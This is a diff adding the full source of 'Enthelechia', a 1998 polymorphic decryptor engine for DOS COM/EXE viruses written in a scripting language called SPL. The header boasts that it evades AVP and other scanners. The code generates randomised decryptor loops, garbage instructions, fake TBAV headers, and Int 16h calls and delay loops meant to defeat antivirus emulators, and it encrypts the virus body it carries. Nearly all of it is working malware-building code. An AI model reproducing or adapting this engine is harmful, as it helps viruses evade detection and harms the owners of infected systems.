@@ -1,0 +1,1121 @@
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   //
+   //   SPL for Windows V2.20
+   //
+   //   Project Name   :  Enthelechia version 1.00  ( Enthelechia=assiduity )
+   //   Author     :  ANAKTAS
+   //   Origin     :  Europe, Greece
+   //   Last Update    :  25/07/98
+   //   Description    :
+   //  -8/16-bit keysize
+   //  -ax/al/ah / bx/bl/bh / cx/cl/ch / dx/dl/dh / bp / si / di   as key register
+   //  -si / di / bx [+si/+di] / bp [+si/+di]  [+displacement]    as pointer
+   //  -MOV reg, / LEA reg,        for setting the pointer register
+   //  -MOV reg, / LEA reg, / SUB reg,reg + OR reg /  SUB reg,reg + ADD reg / XOR reg,reg + OR reg /  XOR reg,reg + ADD reg
+   //   for setting  keyRegister
+   //  -Add / Sub / Lea / Inc / Dec / Not+Neg / XorFFFF+Neg / Neg+Not / Neg+XorFFFF+Neg
+   //   used for manipulation of pointer register
+   //  -Multiple Manipulation of pointer Register, before and after the crypt instruction.
+   //  -Xor/Add/Sub [pointer],keyregister as crypt instruction
+   //  -Two directions
+   //  -JMPs / NOP / CMC / STI / CLD / CLC / STC for garbage
+   //  -Will sometimes create TBAV headers
+   //  -CS: / PUSH CS+POP DS / PUSH CS+POP ES+ES:   for segment
+   //  Instructions are placed in random order (as far as this is possible)
+   //  -The decryptor is devided into 3 logigal sections.
+   //     1)initialization of registers
+   //     2)Decryptor loop
+   //     3)Encrypted virusbody
+   //   Those sections will be placed in the file in random order, and linked to each
+   //   other with JMPs.
+   //  -Will sometimes create CALLs to subfuctions with:
+   //   1) Int 16 calls
+   //   2) delay loops (a.k.a.  "KillerLoop")
+   //
+   //Detection:
+   //  AVP will not detect it. Not even flag it as "suspicion: Type_ComTSR ".
+   //  NOD-ICE will sometimes detect it as "POLY.CRYPT.TSR.EXE virus".
+   //  TBAV will sometimes flag it with '#,J,F,M' but won't record it as infected.
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // --*--External variables --*--
+   // Input -----------------------------------------------------------------------------------
+   variable external EXi_IsCOM;   // xxxx xxx0=yes it's for a COM    //    xxxx xxx1=No it's for an EXE.
+   variable external EXi_VirusBodyStart;       // offset of the virus body
+   variable external EXi_VirusBodyLength;    // lenght of virus. This one can tern into a constant later, if you know the lenght, or just make it equal to 8192 bytes.
+   // output ---------------------------------------------------------------------------------
+   variable external EXo_DecryptorStart;     // offset of decryptor in SPL_BUFFER
+   variable external EXo_DecryptorVirusLength; // That's Decryptor + virus + garbage SIZE
+                       // OR Decryptor + garbage + virus + garbage SIZE
+                       // OR decr/ + garbage + virus + /yptor + garbage SIZE
+   variable external EXo_EncryptorOffset;  // The offset of the Encryption routine in the SPL_BUFFER
+   variable external EXo_EncryptedVirusBodyOffset; // The offset of the Encrypted virus body
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // Important Values
+   // --------------------------------------------------------------------------------------------
+   variable DecryptorStart;
+   variable CryptDisplacement;
+   variable key;
+   variable Displacement;
+   variable IndexDisplacement;
+   variable BaseRegister;
+   variable IndexRegister;
+   variable SillyPointerShiftA;
+   variable SillyPointerShiftB;
+   variable IncreaseRegister;
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   //important switches
+   // --------------------------------------------------------------------------------------------
+   variable SW_Direction;      // 0=down   1=up
+   variable SW_UseDisplacement;    // 0=No 1=Yes
+   variable SW_IndexReg;       // 0=SI 1=DI
+   variable SW_PointerMode;        // 0=Index 1=Base   2=Both   3=Base
+   variable SW_BaseReg;        // 0=BX 1=BP
+   variable SW_UseRegForKey;       // 0=No 1=Yes
+   variable SW_KeySize;        // 0=8bit   1=16bit
+   variable SW_Segment;        // 0=CS:    1=push CS pop DS  2=push CS pop ES
+   variable SW_KeyReg;     // if 8bit  0=AL  1=CL  2=DL  3=BL  4=AH  5=CH  6=DH  7=BH
+                   // if 16bit 0=AX  1=CX  2=DX  3=BX  4=SP  5=BP  6=SI  7=DI
+   variable SW_CryptType;      // 0=ADD    1=SUB   2=XOR
+   variable SW_Sectionsdone;       // 000=none 001=first   010=second   100=third
+   variable SW_UseInt16;       // 0=Don't 1=of course...
+   variable SW_UseKillerLoop;      // 0=Don't 1=I love danger!
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // DynaKillConflicts
+   // _________________
+   // What if SW_keyReg says that the key register is the same with the register used as pointer?
+   // That was a hard question to myself. Should i add flow control like "if (cmp) then else"  on my SplVM?
+   // How could i check for conflicts? Is SPL a crap? No! i found it! SPL is not like other languages, it has
+   // a different kind of flow control. Does not check for anything on runtime. Just follows one of it's billions paths!
+   // Isn't it perfect!  (what? confusing? hm...)
+   // --------------------------------------------------------------------------------------------
+   function DynaKillConflicts   select  SW_UseRegForKey
+   {
+       //noop;
+       select SW_KeySize
+       {
+           select SW_KeyReg
+           {
+               noop;noop;noop;SW_BaseReg=1;
+               noop;noop;noop;SW_BaseReg=1;
+           };
+           select SW_KeyReg
+           {
+               noop;noop;noop;SW_BaseReg=1;
+               SW_KeyReg=2;SW_BaseReg=0;SW_IndexReg=1;SW_IndexReg=0;
+           };
+       };
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // TBAVHEADER
+   // Emit the headers used by TBAV's programs
+   // --------------------------------------------------------------------------------------------
+   function TBAVHeader select randvar
+   {
+       // Don't put a TBAV's header by a ratio of  16/1
+       noop;noop;noop;noop;noop;noop;noop;noop;noop;noop;noop;noop;noop;noop;noop;
+       // TBAV's mark.
+       all{ select  EXi_IsCOM  { all{$24h;$21h;}; all{$0B8h;$8Ch;$0D3h;$15h;$33h;$randvar;}; }; };
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   //  This function will call the Interrupt 16h (keyboard) with
+   //  subfunctions 01h,02h,03h,04h,09h,0Ah,11h,12h which can stop the
+   //  general decryptor of some AV programs.
+   // --------------------------------------------------------------------------------------------
+   function Int16Fuc select SW_UseInt16
+   {
+       noop;
+       all
+       {
+           $0EBh;  $deltab LB_endofInt16;
+
+           label OFS_Int16Fuc;
+
+           random
+           {
+           all { $50h; mathqueue=058h; };  // PUSH AX  , push POP AX to the mathqueue
+           all { $53h; mathqueue=05Bh; };  // PUSH BX  , push POP BX to the mathqueue
+           };
+
+           select randvar {  $0B4h; all{$0B8h;$randvar;};  };          // MOV AH,   or    MOV AX,-- ??
+           select randvar {  $01h; $02h; $03h;$04h; $09h; $11h; $12h; };   // 01h or 02h or 03h 04h or 09h or 11h or 12h
+           $0CDh;$16h; // Int 16
+
+           $=mathqueue;  // POP the Registers AX,BX
+           $=mathqueue;  //
+
+           $0C3h;  // RET
+
+           label LB_endofInt16;
+       };
+   };
+   // --------------------------------------------------------------------------------------------
+   function CallInt16Fuc select SW_UseInt16
+   {
+       noop;
+       all {  $0e8h; $deltaw OFS_Int16Fuc; };   //   CALL  Int16Fuc
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   //   This function will create a delay loop.
+   //   There are two loops, one inside the other, which add a big delay.
+   //   The delay might not be noticed by a user, but TBAV and AVP will get borred decrypting this
+   //   code (timeout check?) , and continue with the next file.
+   // --------------------------------------------------------------------------------------------
+   variable kl_reg1;
+   variable kl_reg2;
+   variable loopvalue;
+   function KillerLoopFuc select SW_UseKillerLoop
+   {
+       noop;
+       all
+       {
+           $0EBh;  $deltab LB_endofKillerLoop
+
+           label OFS_KillerLoop;
+
+           loopvalue=randvar&0011b;
+
+           // asign registers to kl_reg1 and kl_reg1
+           kl_reg1=kl_reg1&111b;
+           kl_reg2=kl_reg2&111b;
+           select kl_reg1 {noop;noop;noop;noop;kl_reg1=0 ;noop;noop;noop;};
+           select kl_reg1 {  kl_reg2=kl_reg2|001; kl_reg2=kl_reg2&110; };
+           select kl_reg2 {noop;noop;noop;noop;kl_reg2=0 ;noop;noop;noop;};
+
+
+           // push registers
+           $=kl_reg1|50h;
+           $=kl_reg2|50h;
+
+           // loop around...
+
+           select randvar {
+               $=0B8h|kl_reg1;   //mov
+               all {$08Dh; $=06 | (kl_reg1<3);  };   //lea
+           };
+           $randvar;$loopvalue;
+
+           label OFS_Kloop_outer;
+
+           select randvar {
+               $=0B8h|kl_reg2;     // mov
+               all {$08Dh; $=06 | (kl_reg2<3);  };   // lea
+           };
+           $randvar;   $=loopvalue^0111b;
+
+           label OFS_Kloop_inner;
+
+           $=48h|kl_reg2;  // dec kl_reg2
+           select randvar { noop;
+               all{ $81h;$=0E0h|kl_reg2;$0ffh;$0ffh;   };  // AND kl_reg2,ffff
+               all{ $85h;$=0C0h|kl_reg2| (kl_reg2<3);   }; // TEST kl_reg2,kl_reg2
+               all{ $81h;$=0F8h|kl_reg2;$0;$0;   };    // CMP kl_reg2,0000
+           };
+           $75h;   $deltab OFS_Kloop_inner;    // jnz OFS_Kloop_inner
+
+           $=48h|kl_reg1;  // dec kl_reg1
+           select randvar { noop;
+               all{ $81h;$=0E0h|kl_reg1;$0ffh;$0ffh;   };  // AND kl_reg1,ffff
+               all{ $85h;$=0C0h|kl_reg1| (kl_reg1<3);   }; // TEST kl_reg1,kl_reg1
+               all{ $81h;$=0F8h|kl_reg1;$0;$0;   };    // CMP kl_reg1,0000
+           };
+           $75h;   $deltab OFS_Kloop_outer;    // jnz OFS_Kloop_outer
+
+
+           // pop registers
+           $=kl_reg2|58h;
+           $=kl_reg1|58h;
+
+           $0C3h;  // RET
+
+           label LB_endofKillerLoop;
+       };
+   };
+   // --------------------------------------------------------------------------------------------
+   function CallKillerLoopFuc select SW_UseKillerLoop
+   {
+       noop;
+       all {  $0e8h; $deltaw OFS_KillerLoop; };   //   CALL  KillerLoop
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // Initialize everything
+   // --------------------------------------------------------------------------------------------
+   function Init  all
+   {
+
+       // Init IP
+       select  EXi_IsCOM {
+           IP=100h;
+           IP= 0f0h+ (randvar & 1fh) ;
+       };
+
+       // Initialize those variables
+       select SW_UseDisplacement { Displacement=0; noop; };
+       select SW_PointerMode { IndexDisplacement=0; IndexDisplacement=0; noop; IndexDisplacement=0; };
+       SillyPointerShiftB=0;
+       SillyPointerShiftA=0;
+
+
+       SW_Sectionsdone=0;      // 000=none 001=first   010=second   100=third
+
+       //those labels are used as variables. Will get recalculated. Are defined as labels because
+       // spl v2.2 doesn't let you use variables with the "offset" and "delta" keywords for backpatching
+       // values.
+       label PointerSetValue;
+       label PointerCheckValue;
+       label PointerFixValue;
+
+
+       DynaKillConflicts;      // Kill'em All
+
+
+
+       // We set the BaseRegister;
+       select SW_BaseReg { BaseRegister=3;BaseRegister=5;};
+       // We set the IndexRegister;
+       select SW_IndexReg { IndexRegister=6;IndexRegister=7;};
+
+       // Set the IncreaseRegister;
+       select SW_PointerMode
+       {
+           select SW_IndexReg { IncreaseRegister=6;  IncreaseRegister=7; };
+           select SW_BaseReg { IncreaseRegister=3;  IncreaseRegister=5; };
+           select SW_BaseReg { IncreaseRegister=3;  IncreaseRegister=5; };
+           select SW_BaseReg { IncreaseRegister=3;  IncreaseRegister=5; };
+       };
+
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // Fin
+   // --------------------------------------------------------------------------------------------
+   function Fin    all
+   {
+
+       // calculate length
+       EXo_DecryptorVirusLength = IP - EXo_DecryptorStart;
+
+
+       select SW_Direction {
+       // Direction down
+       all
+           {
+           PointerSetValue=((OFS_EncryptedVirusBodyStart - SillyPointerShiftB) - Displacement) - IndexDisplacement;
+           PointerCheckValue=(((OFS_EncryptedVirusBodyStart - SillyPointerShiftB) - Displacement) - IndexDisplacement)+(OFS_EncryptedVirusBodyEnd-OFS_EncryptedVirusBodyStart);
+           PointerFixValue=0-(SillyPointerShiftB+SillyPointerShiftA);
+           select SW_KeySize { PointerFixValue=PointerFixValue+1; PointerFixValue=PointerFixValue+2; };
+           };
+       // Direction Up
+       all
+           {
+           PointerSetValue=(((OFS_EncryptedVirusBodyStart - SillyPointerShiftB) - Displacement) - IndexDisplacement)+(OFS_EncryptedVirusBodyEnd-OFS_EncryptedVirusBodyStart);
+           select SW_KeySize { PointerSetValue=PointerSetValue-1; PointerSetValue=PointerSetValue-2; };
+           PointerCheckValue=((OFS_EncryptedVirusBodyStart - SillyPointerShiftB) - Displacement) - IndexDisplacement;
+           select SW_KeySize { PointerCheckValue=PointerCheckValue-1; PointerCheckValue=PointerCheckValue-2; };
+           PointerFixValue=0-(SillyPointerShiftB+SillyPointerShiftA);
+           select SW_KeySize { PointerFixValue=PointerFixValue-1; PointerFixValue=PointerFixValue-2; };
+           };
+       };
+
+
+       OFS_EncryptedVirusBodyStart2=OFS_EncryptedVirusBodyStart2-3;
+
+
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // Gargages.
+   // --------------------------------------------------------------------------------------------
+   function garbage  select randvar
+   {
+       SillyJump;
+       SillyJump;
+       SillyJump;
+       SillyJump;
+       $090h; // NOP
+       $0F5h; // CMC
+       $0FBh; // STI
+       $0FCh; // CLD
+       $0F8h; // CLC
+       $0F9h; // STC
+       noop;   // No garbage
+       noop;   // No garbage
+       noop;   // No garbage
+       noop;   // No garbage
+       noop;   // No garbage
+       noop;   // No garbage
+       noop;   // No garbage
+   };
+
+
+   variable SillyJumpSize;
+
+   function SillyJump all
+   {
+       $0EBh;              // emit op-code of JMP imm8
+       SillyJumpSize= (0Fh & randvar) + 10h;   // SillyJumpSize is now between Fh and 1Fh
+       $SillyJumpSize;         // emit the lower byte of garbagesize
+       IP = IP + SillyJumpSize;        // Inc the Instruction Pointer
+   };                  // virtually we follow the JMP!
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+   function MovPointerToBase all
+   {
+       select randvar
+       {
+           all {$=10111000b | BaseRegister;};      // Mov base,????
+           all {$8Dh; select SW_BaseReg{ $1Eh;$2Eh; };  }; // Lea base,[????]
+       };
+
+       $offset PointerSetValue;
+   };
+
+   function MovPointerToIndex all
+   {
+       select randvar
+       {
+           all {$=10111000b | IndexRegister;};     // Mov index,????
+           all {$8Dh; select SW_IndexReg{ $36h;$3Eh; };  };    // Lea index,[????]
+       };
+
+       $offset PointerSetValue;
+   };
+
+
+
+   function MovIndexDisplacementToIndex all
+   {
+       select randvar
+       {
+           all {$=10111000b | IndexRegister;};     // Mov index,????
+           all {$8Dh; select SW_IndexReg{ $36h;$3Eh; };  };    // Lea index,[????]
+       };
+
+       $IndexDisplacement;
+       $=IndexDisplacement>8;
+   };
+
+
+   function SetPointerReg
+   {
+       select SW_PointerMode
+       {
+           MovPointerToIndex;
+           MovPointerToBase;
+           random{MovPointerToBase;MovIndexDisplacementToIndex; };
+           MovPointerToBase;
+       };
+   };
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // DecryptorFirstPart
+   // --------------------------------------------------------------------------------------------
+   function DecryptorFirstPart all
+   {
+
+
+       select SW_Sectionsdone {
+           noop; noop;
+           all{$0E9h;$deltaw OFS_VirusBody; }; all{$0E9h;$deltaw OFS_VirusBody; };
+           noop;noop;
+           noop;noop; };
+
+       label OFS_FirstPart;
+
+       random
+       {
+           CallInt16Fuc;
+           CallKillerLoopFuc;
+           SetPointerReg;
+           select SW_UseRegForKey
+           {
+               SetKeyReg;
+               //noop;
+           };
+           select SW_Segment { noop; shift{$0Eh;$1Fh;}; shift{$0Eh;$07h;}; };
+       };
+
+       select SW_Sectionsdone {
+           noop; noop;  //000/001
+           all{$0E9h;$deltaw LB_DecryptLoop; }; noop;  //010/011
+           noop;noop; //100/101
+           all{$0E9h;$deltaw LB_DecryptLoop; };noop; //110/111
+           };
+
+
+       SW_Sectionsdone=SW_Sectionsdone|001;
+
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+   variable CryptSecondByte;
+
+   function CryptInstruction all
+   {
+
+   //Emit the segment overide
+   select SW_Segment
+       {
+       $2Eh;
+       select SW_BaseReg {noop; select SW_PointerMode {noop; $3Eh; $3Eh; $3Eh;}; };
+       $26h;
+       };
+
+   //emit the first byte
+
+       select  SW_CryptType
+       {
+           $=00000000b |  (SW_KeySize&1 ); //ADD
+           $=00101000b |  (SW_KeySize&1 ); //SUB
+           $=00110000b |  (SW_KeySize&1 ); //XOR
+       };
+
+
+   // set up the second byte
+
+       // set the displacement bit
+       select SW_UseDisplacement
+       {
+           CryptSecondByte=00000000b;
+           CryptSecondByte=10000000b;
+       };
+
+
+       //set the base, index
+       select SW_PointerMode
+       {
+           CryptSecondByte=CryptSecondByte|00000100b|(SW_IndexReg&1b);
+           CryptSecondByte=CryptSecondByte|00000110b|((SW_BaseReg&1b)^1);
+           CryptSecondByte=CryptSecondByte|(SW_IndexReg&1b)|(SW_BaseReg&1b)<1;
+           CryptSecondByte=CryptSecondByte|00000110b|((SW_BaseReg&1b)^1);
+       };
+
+
+       // If bp is in use but not a displacement, then make voodoo on Intel's people,
+       // and then try to work around
+
+       select SW_UseDisplacement   {
+       select SW_PointerMode{
+           noop;
+           select SW_BaseReg{noop;CryptSecondByte=01000110b;  };
+           noop;
+           select SW_BaseReg{noop;CryptSecondByte=01000110b; };
+           };
+       noop;
+       };
+
+       //set the key reg
+       SW_KeyReg=SW_KeyReg&00000111b;
+       CryptSecondByte=CryptSecondByte|( SW_KeyReg<3);
+
+       $CryptSecondByte;
+
+
+       select SW_UseDisplacement
+       {
+           select SW_PointerMode
+           {
+               noop;select SW_BaseReg{noop;$0; };
+               noop;select SW_BaseReg{noop;$0; };
+           };
+           all{ $Displacement; $=Displacement>8; };
+       };
+
+   };
+
+
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   function loop1 all
+   {
+       $81h;
+       $= 0F8h | ( IncreaseRegister&00000111b );
+       $offset PointerCheckValue;
+       $75h; $deltab LB_DecryptLoop;
+   };
+
+   function loop2 all
+   {
+       $81h;
+       $= 0F8h | (IncreaseRegister&00000111b);
+       $offset PointerCheckValue;
+       $74h;$2;
+       $0EBh; $deltab LB_DecryptLoop;
+   };
+
+   function Loop
+   {
+       select randvar
+       {
+           loop1;
+           loop2;
+       };
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   variable SillyShift;
+
+   function    AddPointer   all
+   {
+       SillyShift=randvar;
+       SillyPointerShiftA=SillyPointerShiftA+SillyShift;
+       $81h; $=0C0h|IncreaseRegister; $=SillyShift;$=SillyShift>8;
+   };
+
+   function    AddPointer2   all
+   {
+       SillyShift=randvar&1111b;
+       SillyPointerShiftA=SillyPointerShiftA+SillyShift;
+       $83h; $=0C0h|IncreaseRegister; $=SillyShift;
+   };
+
+   function    SubPointer   all
+   {
+       SillyShift=randvar;
+       SillyPointerShiftA=SillyPointerShiftA-SillyShift;
+       $81h; $=0E8h|IncreaseRegister; $=SillyShift;$=SillyShift>8;
+   };
+
+   function    SubPointer2   all
+   {
+       SillyShift=randvar&1111b;
+       SillyPointerShiftA=SillyPointerShiftA-SillyShift;
+       $83h; $=0E8h|IncreaseRegister; $=SillyShift;
+   };
+
+   function    LeaPointer   all
+   {
+       SillyShift=randvar;
+       SillyPointerShiftA=SillyPointerShiftA+SillyShift;
+       $8Dh; select IncreaseRegister { noop;noop;noop; $9Fh;noop;$AEh;$B4h;$BDh; }; $=SillyShift; $=SillyShift>8;
+   };
+
+   function    LeaPointer2   all
+   {
+       SillyShift=randvar&1111b;
+       SillyPointerShiftA=SillyPointerShiftA+SillyShift;
+       $8Dh; select IncreaseRegister { noop;noop;noop; $5Fh;noop;$6Eh;$74h;$7Dh; }; $=SillyShift;
+   };
+
+   function    IncPointer   all
+   {
+       SillyPointerShiftA=SillyPointerShiftA+1;
+       $= IncreaseRegister | 40h ;
+   };
+
+   function    DecPointer   all
+   {
+       SillyPointerShiftA=SillyPointerShiftA-1;
+       $= IncreaseRegister | 48h;
+   };
+
+   function    NotNegPointer   all
+   {
+       SillyPointerShiftA=SillyPointerShiftA+1;
+       $0F7h;$=IncreaseRegister|0D0h;
+       $0F7h; $=IncreaseRegister|0D8h;
+   };
+
+   function    NegNotPointer   all
+   {
+       SillyPointerShiftA=SillyPointerShiftA-1;
+       $0F7h;$=IncreaseRegister|0D8h;
+       $0F7h;$=IncreaseRegister|0D0h;
+   };
+
+
+   function    ManipulatePointer  select randvar
+   {
+       noop;
+       noop;
+       noop;
+       noop;
+       IncPointer;
+       DecPointer;
+       NotNegPointer;
+       NegNotPointer;
+       AddPointer;
+       AddPointer2;
+       SubPointer;
+       SubPointer2;
+       LeaPointer2;
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+   function FixPointer all
+   {
+       $81h; $=0C0h|IncreaseRegister; $offset PointerFixValue ;
+   };
+
+
+
+
+   function DecryptorSecondPart all
+   {
+
+       select SW_Sectionsdone {
+           all{ $0E9h; $deltaw OFS_FirstPart; }; noop;
+           noop; noop;
+           noop; noop;
+           noop; noop;  };
+
+       label LB_DecryptLoop;
+
+       random
+       {
+           shift   {
+               all{CryptInstruction; SillyPointerShiftB=SillyPointerShiftA; SillyPointerShiftA=0; };
+               FixPointer;
+               };
+           ManipulatePointer;
+           ManipulatePointer;
+           ManipulatePointer;
+       };
+       Loop;
+
+
+       select SW_Sectionsdone {
+           noop;noop;   //000/001
+           noop;noop;   //010/011
+           all{ $0E9h;  $deltaw OFS_VirusBody; };all{ $0E9h; $deltaw OFS_VirusBody; };   //100/101
+           noop;noop;  //110/111
+            };
+
+
+       SW_Sectionsdone=SW_Sectionsdone|010;
+
+   };
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   function MovRegKey all
+   {
+       SW_KeyReg=SW_KeyReg&00000111b;
+
+       select SW_KeySize
+       {
+           $=10110000b | SW_KeyReg;
+           $=10111000b | SW_KeyReg;
+       };
+
+       $key;
+       select SW_KeySize{ noop;$=key>8; };
+   };
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   function CleanRegKey all
+   {
+       // Emit the first byte. XOR or SUB
+       select randvar
+       {
+       $=00110000b | ( SW_KeySize&1);
+       $=00101000b | ( SW_KeySize&1);
+       };
+       //emit the second byte.  KeyReg,KeyReg
+       SW_KeyReg=SW_KeyReg&00000111b;
+       $=( SW_KeyReg | (SW_KeyReg<3) | 11000000b );
+   };
+
+
+   function SetRegKey all
+   {
+       SW_KeyReg=SW_KeyReg&00000111b;
+       select SW_KeyReg
+       {
+       all {   $=00000100b |   ( SW_KeySize&1); };
+       all {   $=10000000b |   ( SW_KeySize&1); $=11000000b| SW_KeyReg | (randvar&00001000b);     };
+       all {   $=10000000b |   ( SW_KeySize&1); $=11000000b| SW_KeyReg | (randvar&00001000b);     };
+       all {   $=10000000b |   ( SW_KeySize&1); $=11000000b| SW_KeyReg | (randvar&00001000b);     };
+       all {   $=10000000b |   ( SW_KeySize&1); $=11000000b| SW_KeyReg | (randvar&00001000b);     };
+       all {   $=10000000b |   ( SW_KeySize&1); $=11000000b| SW_KeyReg | (randvar&00001000b);     };
+       all {   $=10000000b |   ( SW_KeySize&1); $=11000000b| SW_KeyReg | (randvar&00001000b);     };
+       all {   $=10000000b |   ( SW_KeySize&1); $=11000000b| SW_KeyReg | (randvar&00001000b);     };
+       };
+       $key;
+       select SW_KeySize{ noop;$=key>8; };
+   };
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // SetKeyReg
+   // --------------------------------------------------------------------------------------------
+   variable SW_SetKeyRegInstrType; // 0=MOV    1=ClearReg & OR/XOR/ADD/SUB + SetReg OR,XOR,ADD,SUB
+   variable SW_SetKeyRegDataType;  // 0=Imm    1=Address
+   variable OP_SetKey;
+
+   function SetKeyReg select randvar
+   {
+       MovRegKey;
+       shift   {
+           CleanRegKey;
+           SetRegKey;
+           };
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   function Encryptor all
+   {
+
+       IP=0;   // the decryptor starts at offset 0000
+
+       label EXo_EncryptorOffset;
+
+       //push registers
+       $50h;$53h;$56h;$57h;
+
+       //set registers
+       $0BBh;$key; $=key>8;    // mov bx,
+       select SW_KeySize {noop; EXi_VirusBodyLength= (EXi_VirusBodyLength+2)>1;  };
+       $0B9h;$EXi_VirusBodyLength;$=EXi_VirusBodyLength>8;   // mov cx,
+       $0BEh;$EXi_VirusBodyStart;$=EXi_VirusBodyStart>8;       // mov si,
+       $0BFh;$OFS_EncryptedVirusBodyStart;$=OFS_EncryptedVirusBodyStart>8;      // mov di,
+
+       //encryption loop
+       label encryption_loop;
+
+       select SW_KeySize {  $0ACh;  $0ADh;  };   // lodsb/lodsw
+
+       select  SW_CryptType
+       {
+           $=00101000b |  (SW_KeySize&1 ); //SUB
+           $=00000000b |  (SW_KeySize&1 ); //ADD
+           $=00110000b |  (SW_KeySize&1 ); //XOR
+       };
+
+       $0D8h;
+
+       select SW_KeySize {  $0AAh;  $0ABh;  };   // stosb/stosw
+       $0E2h;$deltab encryption_loop;  // loop encryption_loop;
+
+       //pop registers
+       $5Fh;$5Eh;$5Bh;$58h;
+
+       $0CBh;  //retf
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+   // This of course, is not the virus body.
+   // But it reserves the necesary space, and keeps tracks of where the virusbody
+   // should start/end. The encryptor will later encrypt and copy the virus body here.
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // this is the virus body
+   function VirusBody all
+   {
+
+       select SW_Sectionsdone {
+           all{ $0E9h; $deltaw OFS_FirstPart; }; all{ $0E9h; $deltaw LB_DecryptLoop; };    //000/001
+           noop; noop;   // 010/011
+           noop;noop;     //100/101
+           noop;noop;     //110/111
+            };
+       label OFS_VirusBody;
+
+
+       // Clean the prefetch queue if needed
+       select SW_Direction { noop; all {$0EBh; $0;};  };
+
+       //place a MOV BP, offset
+       // the "CALL $+3/POP BP" is not necesary in the virus code
+       //$0BDh; $offset OFS_EncryptedVirusBodyStart2;
+
+       EXo_EncryptedVirusBodyOffset=IP;
+
+
+       label OFS_EncryptedVirusBodyStart;
+       label OFS_EncryptedVirusBodyStart2;
+
+       IP=IP+EXi_VirusBodyLength+2;
+
+       label OFS_EncryptedVirusBodyEnd;
+
+
+       SW_Sectionsdone=SW_Sectionsdone|100;
+
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   // The main bone
+   // --------------------------------------------------------------------------------------------
+   main all
+   {
+       Init;
+
+       label EXo_DecryptorStart;   // Time to set this External variable
+
+       TBAVHeader;
+
+       random
+       {
+           garbage;
+           garbage;
+           Int16Fuc;
+           KillerLoopFuc;
+           DecryptorFirstPart;
+           DecryptorSecondPart;
+           VirusBody;
+       };
+
+       Fin;
+
+       Encryptor;
+
+   };
+   //////////////////////////////////////////////////////////////////////////////////////////////
+   //////////////////////////////////////////////////////////////////////////////////////////////
